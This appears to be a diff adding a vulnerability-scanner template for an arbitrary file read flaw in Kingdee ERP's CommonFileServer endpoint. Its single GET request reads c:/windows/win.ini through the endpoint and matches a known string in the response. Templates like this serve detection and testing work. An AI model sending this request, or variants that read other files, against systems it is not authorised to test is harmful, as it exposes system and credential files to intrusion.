@@ -1,0 +1,23 @@
+id: kingdee-commonfileserver-fileread
+info:
+  name: 金蝶 ERP commonfileserver 接口 - 任意文件读取漏洞
+  author: secking
+  severity: high
+  reference:
+    - http://www.ebcbj.com/products/galaxy.html
+  metadata:
+    verified: true
+    max-request: 1
+    vuln-id: CT-838935
+    vendor: kingdee
+    product: erp
+  tags: file-read,vuln,kingdee
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/CommonFileServer/c:/windows/win.ini'
+    redirects: false
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, "for 16-bit app support")'
